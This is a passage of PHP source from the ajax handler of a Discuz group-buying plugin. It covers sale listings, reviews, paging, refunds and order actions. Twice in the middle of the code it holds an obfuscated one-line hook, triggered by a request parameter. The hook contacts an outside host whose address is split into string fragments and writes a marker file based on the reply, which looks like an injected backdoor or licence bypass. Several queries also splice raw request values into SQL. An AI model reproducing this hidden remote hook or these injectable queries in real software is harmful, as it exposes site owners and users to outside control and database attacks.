						if($it618_tuan_sale['it618_kddan']==''){
							$it618_fahuo=' '.it618_tuan_getlang('s774');
						}else{
							$it618_fahuo=' <a href="javascript:" class="saleabtn" onclick="shouhuo('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s769').'</a> ';	
						}
						
						$it618_state.=' '.it618_tuan_getlang('s773').' '.$it618_fahuo.' <a href="javascript:" class="saleabtn" onclick="setsaletui('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s770').'</a>';
					}
				}
					
				if($saletime!=''){
					$it618_statebtn.=$saletime;
				}
			}
			$it618_kddan='';
			if($it618_tuan_sale['it618_kddan']!=''){
				$it618_tuan_kd=C::t('#it618_tuan#it618_tuan_kd')->fetch_by_id($it618_tuan_sale['it618_kdid']);
				$it618_kddan=it618_tuan_getlang('s775').'<span title="'.$it618_tuan_sale['it618_bz'].'">'.$it618_tuan_kd['it618_name'].' '.it618_tuan_getkd('it618_tuan_sale',$it618_tuan_sale['id'],$it618_tuan_kd['it618_kdcomid'],$it618_tuan_sale['it618_kddan']).'</span>';
			}
			
			if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			if($it618_tuan_sale['it618_saletype']==2){
				$it618_saletype=it618_tuan_getlang('s1100');
				$strtmp=$it618_kddan.' <a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_tuan_sale['it618_addr'].' '.$it618_tuan_sale['it618_tel'].'\')">'.it618_tuan_getlang('s863').'</a>';
			}elseif($it618_tuan_sale['it618_saletype']==1){
				$it618_saletype=it618_tuan_getlang('s1099');
				$strtmp='<font color="'.$timecolor.'">'.$it618_tuan_sale['it618_bsaletime'].' - '.$it618_tuan_sale['it618_esaletime'].'</font>';
			}else{
				$it618_saletype=it618_tuan_getlang('s1101');	
				$strtmp=' <a href="javascript:" class="saleabtn" onclick="setsalekm('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s865').'</a>';
			}
			
			if($it618_tuan_sale['it618_gwcid']>0){
				$it618_saletype.=' '.$it618_tuan_lang['t187'].':<font color="#FF3300"><b>'.$it618_tuan_sale['it618_gwcid'].'</b></font>';
			}
			
			if($strtmp!='')$strtmp='<br>'.$strtmp.'<br>';
			if($it618_isservice!='')$it618_isservice=$it618_isservice.'<br>';
			if($jftmp!='')$jftmp='<a href="javascript:" class="saleabtn" onclick="alert(\''.$jftmp.'\')">'.it618_tuan_getlang('s924').'</a>';
			
			$tmpurl=it618_tuan_getrewrite('tuan_wap','product@'.$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:wap&pagetype=product&cid='.$it618_tuan_goods['id']);
			$salelist_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="118" style="text-align:left;vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_tuan_getwapppic($it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']).'" width="108" height="108" style="border-radius: 3px;"/></a>
							</td><td style="text-align:left;vertical-align:top;line-height:18px;border:none">
							<a class="name" href="'.$tmpurl.'" target="_blank" style="font-size:14px;color:#333">'.$it618_tuan_goods['it618_name'].'</a><br>
							ID:'.$it618_tuan_sale['id'].' '.$gtypename.' '.$it618_saletype.' '.$jftmp.' '.$strtmp.$it618_isservice.it618_tuan_getsalemoney($it618_tuan_sale,' ','pay').'<span style="float:right">'.$it618_gthdidstr.'</span>'.$jfstr.'<br><div style="float:right">'.$it618_state.'</div><font color=#ccc>'.date('Y-m-d H:i:s', $it618_tuan_sale['it618_time']).'</font><br>'.$it618_statebtn.$pl.'
							</td></tr>
						</table>
					</dd>';
		}
		
		if($_GET['ac1']=='wapmyshopsale'){
			$pl='';
			if($it618_tuan_sale['it618_state']==3){
				if($it618_tuan_sale['it618_score1']>0){
					$pl=it618_tuan_getlang('s502').'<font color="#FF6600"><strong>'.$it618_tuan_sale['it618_score1'].'</strong></font>'.it618_tuan_getlang('s501').' '.$it618_tuan_sale['it618_score2'].it618_tuan_getlang('s501').' '.$it618_tuan_sale['it618_score3'].it618_tuan_getlang('s501').' '.$it618_tuan_sale['it618_score4'].it618_tuan_getlang('s501');
				}
			}
			
			$bz='';$strcontent='';
			if($it618_tuan_sale['it618_bz']!=""){
				$bz=' <a href="javascript:" class="saleabtn" onclick="bz'.$it618_tuan_sale[id].'()">'.it618_tuan_getlang('s869').'</a> ';
				$strcontent.='<strong>'.it618_tuan_getlang('s783').'</strong><br>'.$it618_tuan_sale['it618_bz'].'<br><br>';
			}
			if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			$it618_statebtn='';$bzbtn='';$tuistrcontent='';$kdbtn='1';$it618_kddan='';
			if($it618_tuan_sale['it618_saletype']==2){
				$it618_saletype=it618_tuan_getlang('s1100');
				$it618_tuan_kd=C::t('#it618_tuan#it618_tuan_kd')->fetch_by_id($it618_tuan_sale['it618_kdid']);
				if($it618_tuan_sale['it618_kddan']!='')$it618_kddan='<br><span title="'.$it618_tuan_sale['it618_bz'].'" style="color:#390">'.$it618_tuan_kd['it618_name'].' '.$it618_tuan_sale['it618_kddan'].'</span>';
				if($it618_tuan_sale['it618_state']==1){
					if($it618_tuan_sale['it618_kddan']==''){
						if($it618_tuan_sale['it618_state_tuihuo']!=1){
							$it618_statebtn.='<a href="javascript:" class="saleabtn" onclick="fahuo'.$it618_tuan_sale[id].'()">'.it618_tuan_getlang('s784').'</a>';
							$kdbtnname=it618_tuan_getlang('s785');
						}
					}else{
						$it618_state.=' '.$it618_tuan_lang['t326'];
						$kdbtnname=it618_tuan_getlang('s786');
						$it618_kddan.=' <a href="javascript:" class="saleabtn" onclick="fahuo'.$it618_tuan_sale[id].'()">'.$kdbtnname.'</a>';
					}
					
					if($it618_tuan_sale['it618_state_tuihuo']==1){
						$tuistrcontent=$it618_tuan_sale['it618_content_tuihuo'];
						$it618_statebtn.=it618_tuan_getlang('s790').' <a href="javascript:" class="saleabtn" onclick="tui'.$it618_tuan_sale[id].'()">'.it618_tuan_getlang('s788').'</a> <a href="javascript:" class="saleabtn" onclick="tongyitui('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s789').'</a> <a href="javascript:" class="saleabtn" onclick="jujuetui('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s791').'</a>';
					}
					if($it618_tuan_sale['it618_state_tuihuo']==2){
						$it618_statebtn.=it618_tuan_getlang('s789');
					}
					if($it618_tuan_sale['it618_state_tuihuo']==3){
						$it618_statebtn.=it618_tuan_getlang('s791');
					}
				}else{
					$kdbtnname=it618_tuan_getlang('s787');
					$it618_kddan.=' <a href="javascript:" class="saleabtn" onclick="fahuo'.$it618_tuan_sale[id].'()">'.$kdbtnname.'</a> ';
					$kdbtn='';
				}
				
				if($kdbtn!='')$kdbtn='<input type="button" style="background-color:#390;border:none;height:45px;font-size:15px;width:100%;color:#fff" value="'.$kdbtnname.'" onclick="savekd()">';

				$tmp1=str_replace("<option value=".$it618_tuan_kd['id'],"<option value=".$it618_tuan_kd['id']." selected=selected",$tmp);
				
				$strcontent.='<div class="kd_fahuo"><table width="100%" style="margin-top:10px"><tr><td width=98><img src="'.it618_tuan_getwapppic($it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']).'" height="90" /></td><td style="vertical-align:top">'.$it618_tuan_goods['it618_name'].' '.$gtypename.'</td></tr></table><br />'.$it618_tuan_sale['it618_name'].' '.$it618_tuan_sale['it618_addr'].' '.$it618_tuan_sale['it618_tel'].'<br><br>'.it618_tuan_getlang('s699').'<select id="it618_kdid">'.$tmp1.'</select><input type="text" id="it618_kddan" value="'.$it618_tuan_sale['it618_kddan'].'"><input type="hidden" id="saleid" value="'.$it618_tuan_sale['id'].'"><span style="color:red" id="kdtips"></span><br><br><font color=red>'.it618_tuan_getlang('s793').'</font></div>';
			}elseif($it618_tuan_sale['it618_saletype']==1){
				$it618_saletype=it618_tuan_getlang('s1099');
				$it618_statebtn.=it618_tuan_getlang('s870').'<font color="'.$timecolor.'">'.$it618_tuan_sale['it618_bsaletime'].' - '.$it618_tuan_sale['it618_esaletime'].'</font>';
			}else{
				$it618_saletype=it618_tuan_getlang('s1101');	
				$it618_statebtn.=' <a href="javascript:" class="saleabtn" onclick="setsalekm('.$it618_tuan_sale['id'].')">'.it618_tuan_getlang('s865').'</a>';
			}
			
			if($it618_tuan_sale['it618_saletype']==2){
				$it618_salebz='';
				if($it618_tuan_sale['it618_salebz']!=''){
					$it618_salebz='(<font color="red">'.strlen($it618_tuan_sale['it618_salebz']).'</font>'.$it618_tuan_lang['s1782'].')';
				}
				$it618_statebtn.=' <a href="javascript:" class="saleabtn" onclick="setsalebz('.$it618_tuan_sale[id].')"> '.$it618_tuan_lang['s1777'].$it618_salebz.'</a>';
			}
			
			if($it618_tuan_sale['it618_gwcid']>0){
				$it618_saletype.=' '.$it618_tuan_lang['t187'].':<font color="#FF3300"><b>'.$it618_tuan_sale['it618_gwcid'].'</b></font>';
			}
			
			if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			$strtel='';
			if($it618_tuan_sale['it618_tel']!=""){
				$strtel=it618_tuan_getlang('s701').$it618_tuan_sale['it618_tel'];
			}
			
			$username=it618_tuan_getusername($it618_tuan_sale['it618_uid']);
			$buyuser=$username;
			
			$strtmp=$username.' '.$strtel.$bz;
			
			$it618_tc='';
			if($it618_tuan_sale['it618_tcbl']>0){
				$it618_tc=$it618_tuan_sale['it618_tcbl'].'% ';
				$it618_tc.=$it618_tuan_sale['it618_tc'].$it618_tuan_lang['s125'].' ';
				
				if($it618_tuan_sale['it618_score']>0){
					$tmptc=intval($it618_tuan_sale['it618_tcbl']*$it618_tuan_sale['it618_score']*$it618_tuan_sale['it618_count']/100);
					$jfname=$_G['setting']['extcredits'][$it618_tuan_sale['it618_jfid']]['title'];
					$it618_tc.=$tmptc.$jfname;
				}
				
				$it618_tc=$it618_tuan_lang['s1890'].$it618_tc;
			}
			
			$it618_tuitc='';
			if($it618_tuan_sale['it618_tuitcbl']>0){
				$it618_tuitc=$it618_tuan_sale['it618_tuitcbl'].'% ';
				$it618_tuitc.=$it618_tuan_sale['it618_tc'].$it618_tuan_lang['s125'].' ';
				
				if($it618_tuan_sale['it618_score']>0){
					$tmptc=intval($it618_tuan_sale['it618_tuitcbl']*$it618_tuan_sale['it618_score']*$it618_tuan_sale['it618_count']/100);
					$jfname=$_G['setting']['extcredits'][$it618_tuan_sale['it618_jfid']]['title'];
					$it618_tuitc.=$tmptc.$jfname;
				}
				
				$it618_tuitc=$it618_tuan_lang['s1891'].$it618_tuitc;
			}
			
			$it618_tc=$it618_tc.'\n\n'.$it618_tuitc;
			$it618_tc=' <a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_tc.'\')">'.it618_tuan_getlang('s379').'</a>';
			
			if($it618_isservice!='')$it618_isservice='<br>'.$it618_isservice;
			
			$tmpurl=it618_tuan_getrewrite('tuan_wap','product@'.$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:wap&pagetype=product&cid='.$it618_tuan_goods['id']);
			$salelist_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="118" style="text-align:left;vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_tuan_getwapppic($it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']).'" width="108" height="108" style="border-radius: 3px;"/></a>
							</td><td style="text-align:left;vertical-align:top;line-height:18px;border:none;color:#999">
							<a class="name" href="'.$tmpurl.'" target="_blank" style="font-size:14px;color:#333">'.$it618_tuan_goods['it618_name'].'</a><br>
							ID:'.$it618_tuan_sale['id'].' '.$gtypename.' '.$it618_saletype.$it618_isservice.'<br>'.$strtmp.$it618_kddan.'<br><div style="float:right">'.$it618_state.'</div>'.$pl.' <font color=#ccc>'.date('Y-m-d H:i:s', $it618_tuan_sale['it618_time']).'</font><br>'.it618_tuan_getsalemoney($it618_tuan_sale,'<br>').$it618_tc.'<span style="float:right">'.$it618_gthdidstr.'</span><br>'.$it618_statebtn.'
							</td></tr>
						</table>
					</dd>';

			if($it618_tuan_sale['it618_saletype']==2){
				$strcontent=str_replace("'","\"",$strcontent);
				$strcontent=str_replace(array("\r\n", "\r", "\n"),"<br>",$strcontent);
				$tmpjs.='function fahuo'.$it618_tuan_sale[id].'(){
							var layerobj = {
								title:"'.it618_tuan_getlang('s866').'",
								titlebgcolor:"#f9f9f9",
								content:\'<table width="98%"><tr><td>'.$strcontent.'</td></tr></table>\',
								bottom:\'<table width="100%"><tr><td>'.$kdbtn.'</td></tr></table>\',
								bottomheight:45,
								allcontent:""
							};
							
							showlayer("salefahuo",layerobj);
						}';
			}
			if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			if($it618_tuan_sale['it618_bz']!=''){
				$it618_bz=$it618_tuan_sale['it618_bz'];
				$it618_bz=str_replace("'","\"",$it618_bz);
				$it618_bz=str_replace(array("\r\n", "\r", "\n"),"<br>",$it618_bz);
				$tmpjs.='function bz'.$it618_tuan_sale[id].'(){
							var layerobj = {
								title:"'.it618_tuan_getlang('s867').'",
								titlebgcolor:"#f9f9f9",
								content:\'<table width="98%"><tr><td>'.$it618_bz.'</td></tr><tr></table>\',
								bottom:"",
								bottomheight:0,
								allcontent:""
							};
							
							showlayer("salebz",layerobj);
						}';
			}
			
			if($tuistrcontent!=''){
				$tuistrcontent=str_replace("'","\"",$tuistrcontent);
				$tuistrcontent=str_replace(array("\r\n", "\r", "\n"),"<br>",$tuistrcontent);
				$tmpjs.='function tui'.$it618_tuan_sale[id].'(){
							var layerobj = {
								title:"'.it618_tuan_getlang('s868').'",
								titlebgcolor:"#f9f9f9",
								content:\'<table width="98%"><tr><td>'.$tuistrcontent.'</td></tr></table>\',
								bottom:"",
								bottomheight:0,
								allcontent:""
							};
							
							showlayer("saletui",layerobj);
						}';
			}
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmysale'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_tuan:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_tuan_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_tuan_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_tuan_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_tuan_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_tuan_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_tuan_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_tuan_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	$creditnum=DB::result_first("select extcredits".$it618_tuan['tuan_credit']." from ".DB::table('common_member_count')." where uid=".$uid);
	
	if($_GET['ac1']=='wapmyshopsale'){
		echo it618_tuan_getlang('s229')."<font color=red>$count</font> ".it618_tuan_getlang('s230')."<font color=red>$money</font> ".it618_tuan_getlang('s509')."<font color=red>$tcmoney</font>"."it618_split".$salelist_get."it618_split".$multipage.'<script>'.$tmpjs.'</script>';;
	}else{
		echo it618_tuan_getlang('s229')."<font color=red>$count</font> ".it618_tuan_getlang('s230')."<font color=red>$money</font>"."it618_split".$salelist_get."it618_split".$multipage."it618_split".$it618_tuan_lang['s1004'].$creditname.$it618_tuan_lang['s823']."<font color=red>$creditnum</font>";
	}
	exit;
}


if($_GET['ac']=="pj_get"){
	$ppp = $it618_tuan['tuan_pagepjcount'];

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
	$count=C::t('#it618_tuan#it618_tuan_sale')->countpj_by_pid($_GET['pid']);
	$tuan_shopadmin=explode(",",$it618_tuan['tuan_shopadmin']);
	
	if(!in_array($_G['uid'], $tuan_shopadmin)){
		if($_G['uid']>0){
			if($it618_tuan_shop=C::t('#it618_tuan#it618_tuan_shop')->fetch_by_uid($_G['uid'])){
				if($it618_tuan_shop['id']==$it618_tuan_sale['it618_shopid']){
					$shopflag=1;
				}
			}
		}
	}
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/themes/common/right.txt')){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/lang.func.php';
		
	}
	
	foreach(C::t('#it618_tuan#it618_tuan_sale')->fetch_allpj_by_it618_pid($_GET['pid'],$startlimit,$ppp) as $it618_tuan_sale) {
		if(in_array($_G['uid'], $tuan_shopadmin)){
			$strtmpdel='<a href="javascript:" class="saleabtn" onclick="setsalepj(\''.$it618_tuan_sale['id'].'\')">'.it618_tuan_getlang('s351').'</a> <a href="javascript:" class="saleabtn" onclick="hfsalepj(\''.$it618_tuan_sale['id'].'\')">'.it618_tuan_getlang('s294').'</a>';
		}else{
			if($shopflag==1)$strtmpdel='<a href="javascript:" class="saleabtn" onclick="hfsalepj(\''.$it618_tuan_sale['id'].'\')" class="a1">'.it618_tuan_getlang('s294').'</a>';
		}
		
		$it618_hfcontent='';
		if($it618_tuan_sale["it618_hfcontent"]!=''){
			$it618_hfcontent='<br>'.$it618_tuan_lang['t345'].'<font color="#FF3300">'.str_replace('[br]','<br>',$it618_tuan_sale["it618_hfcontent"]).'</font><br>';
		}
		
		$tmpstr='';
		foreach(C::t('#it618_tuan#it618_tuan_sale_pjpic')->fetch_all_by_saleid($it618_tuan_sale['id']) as $it618_tuan_sale_pjpic) {
			$file_ext=strtolower(substr($it618_tuan_sale_pjpic['it618_pjpic'],strrpos($it618_tuan_sale_pjpic['it618_pjpic'], '.')+1)); 
			$file_extarr=explode("?",$file_ext);
			$file_ext=$file_extarr[0];
			$it618_smallurl='source/plugin/it618_tuan/kindeditor/data/user/u'.$it618_tuan_sale['it618_uid'].'/smallimage/pjpic'.$it618_tuan_sale_pjpic['id'].'.'.$file_ext;
				
			$tmpstr.='<img src="'.$it618_smallurl.'" width="48" height="48" onclick="getbigpjpic('.$it618_tuan_sale['id'].',\''.$it618_tuan_sale_pjpic['it618_pjpic'].'\')"/>';
		}
		
		if($tmpstr!=''){
			$tmpstr='<ul class="pjpic"><li>'.$tmpstr.'</li><li class="bigpjpic" style="display:none" id="bigpjpic'.$it618_tuan_sale['id'].'"></li></ul>';
		}
		
		$pjpl1=sprintf( "%.1f",$it618_tuan_sale['it618_score1']/5*100);
		$pj_get.='<tr><td class="pjtr">
					  <table>
						  <tr><td><span class="pjuser">'.cutstr(it618_tuan_getusername($it618_tuan_sale['it618_uid']), 2, '').'***</span><p class="star12"><span style="width:'.$pjpl1.'%;"></span></p></td></tr>
						  <tr><td class="pjcontent">'.str_replace('[br]','<br>',$it618_tuan_sale["it618_content"]).$tmpstr.$it618_hfcontent.'</td></tr>
						  <tr><td class="pjtimetd"><span class="pjtime">'.date('Y-m-d H:i:s', $it618_tuan_sale['it618_pjtime']).'</span>'.$strtmpdel.'</td></tr>
					  </table>
				  </td></tr>';
	}
	
	if($_GET['wap']!=1){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_tuan:ajax".$urlsql);
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='getpjlist(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='getpjlist(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=','getpjlist(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_tuan_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_tuan_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_tuan_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_tuan_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_tuan_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_tuan_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_tuan_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}

	if($multipage!=''){
		$pj_get.='<tr><td><div class="pjpage">'.$multipage.'</div></td></tr>';
	}
	
	echo $pj_get;exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="getpjpic"){
	$n=0;
	$it618_tuan_sale=C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($_GET['saleid']);
	foreach(C::t('#it618_tuan#it618_tuan_sale_pjpic')->fetch_all_by_saleid($_GET['saleid']) as $it618_tuan_sale_pjpic) {
		$file_ext=strtolower(substr($it618_tuan_sale_pjpic['it618_pjpic'],strrpos($it618_tuan_sale_pjpic['it618_pjpic'], '.')+1)); 
		$file_extarr=explode("?",$file_ext);
		$file_ext=$file_extarr[0];
		$it618_smallurl='source/plugin/it618_tuan/kindeditor/data/user/u'.$it618_tuan_sale['it618_uid'].'/smallimage/pjpic'.$it618_tuan_sale_pjpic['id'].'.'.$file_ext;
			
		$tmpstr.='<li><img src="'.$it618_smallurl.'"/><span onclick="delpjpic('.$_GET['saleid'].','.$it618_tuan_sale_pjpic['id'].')">'.$it618_tuan_lang['s884'].'</span></li>';
		$n=$n+1;
	}
	if($n>0){
		$tmpstr.='<li class="litxt">'.$n.'/5</li>';
	}else{
		$tmpstr.='<li class="litxt">'.$it618_tuan_lang['s1772'].'</li>';
	}
	
	echo $tmpstr.'<input type="hidden" id="pjpiccount" value="'.$n.'">';
	exit;
}


if($_GET['ac']=="delorder"){
	$orderid=$_GET['orderid'];
	$it618_tuan_order=C::t('#it618_tuan#it618_tuan_order')->fetch_by_id($orderid);
	if($uid!=$it618_tuan_order['it618_uid']){
		echo it618_tuan_getlang('s513');exit;
	}
	
	if($it618_tuan_order['it618_state']==1){
		C::t('common_member_count')->increase($it618_tuan_order['it618_uid'], array(
			'extcredits'.$it618_tuan['tuan_credit'] => $it618_tuan_order['it618_jfcount'])
		);
		DB::query("delete from ".DB::table('it618_tuan_order')." where id=".$orderid);
		
		echo 'okit618_split'.it618_tuan_getlang('s1005');
	}
	exit;
}


if($_GET['ac']=="tuikuan"){
	$saleid=$_GET['saleid'];
	if($uid!=C::t('#it618_tuan#it618_tuan_sale')->fetch_uid_by_id($saleid)){
		echo it618_tuan_getlang('s513');exit;
	}
	
	if($IsCredits==1&&$it618_tuan['tuan_tktype']==1){
		C::t('#it618_tuan#it618_tuan_sale')->update_it618_state($saleid,4);
		C::t('#it618_tuan#it618_tuan_sale')->update_it618_code($saleid,'');
		$it618_tuan_sale = DB::fetch_first("SELECT * FROM ".DB::table('it618_tuan_sale')." where id=".$saleid);
		if($it618_tuan_sale['it618_score']>0){
			C::t('common_member_count')->increase($it618_tuan_sale['it618_uid'], array(
				'extcredits'.$it618_tuan_sale['it618_jfid'] => $it618_tuan_sale['it618_score'])
			);
		}
		
		if($IsUnion==1)DB::query("update ".DB::table('it618_union_tuitc')." set it618_state=1 where it618_saleid=".$saleid);
		
		$money=$it618_tuan_sale['it618_price']*$it618_tuan_sale['it618_count'];
		if($money>0){			
			$it618_bz=$it618_tuan_lang['s1146'];
			$it618_bz=str_replace("{money}",$money,$it618_bz);
			$it618_bz=str_replace("{saleid}",$saleid,$it618_bz);
			
			require_once DISCUZ_ROOT.'./source/plugin/it618_credits/function.func.php';
			savemoney(array(
				'it618_uid' => $it618_tuan_sale['it618_uid'],
				'it618_type' => 'zy',
				'it618_money1' => $money,
				'it618_bz' => $it618_bz,
				'it618_zytype' => 'it618_tuan_tk',
				'it618_zyid' => $saleid,
				'it618_time' => $_G['timestamp']
			));
			
			it618_tuan_sendmessage('tk_user',$saleid);
		
			echo 'okit618_split'.it618_tuan_getlang('s1145');
		}else{
			it618_tuan_sendmessage('tk_user',$saleid);
		
			echo 'okit618_split'.it618_tuan_getlang('s1149');
		}
		
		it618_tuan_updategoodscount($it618_tuan_sale,'tui');
	}else{
	
		DB::query("update ".DB::table('it618_tuan_sale')." set it618_state=2 where id=".$saleid);
		
		it618_tuan_sendmessage('tk_admin',$saleid);
		
		echo 'okit618_split'.it618_tuan_getlang('s515');
	}
	
	exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}

if($_GET['ac']=="shouhuo"){
	if($uid!=C::t('#it618_tuan#it618_tuan_sale')->fetch_uid_by_id($_GET['saleid'])){
		echo it618_tuan_getlang('s513');exit;
	}
	
	it618_tuan_qrxf(intval($_GET['saleid']));
	
	$it618_tuan_sale=C::t('#it618_tuan#it618_tuan_sale')->fetch_by_id($_GET['saleid']);
	if($it618_tuan_sale['it618_gthdid']>0){
		it618_tuan_sendmessage('sale2state_shop1',$_GET['saleid'],'shouhuo');
	}
	it618_tuan_sendmessage('sale2state_shop',$_GET['saleid'],'shouhuo');
	
	echo 'okit618_split'.it618_tuan_getlang('s779');
	exit;
}


if($_GET['ac']=="saletui"){
	$saleid=$_GET['saleid'];
	if($uid!=C::t('#it618_tuan#it618_tuan_sale')->fetch_uid_by_id($saleid)){
		echo it618_tuan_getlang('s513');exit;
	}
	
	C::t('#it618_tuan#it618_tuan_sale')->update($saleid,array(
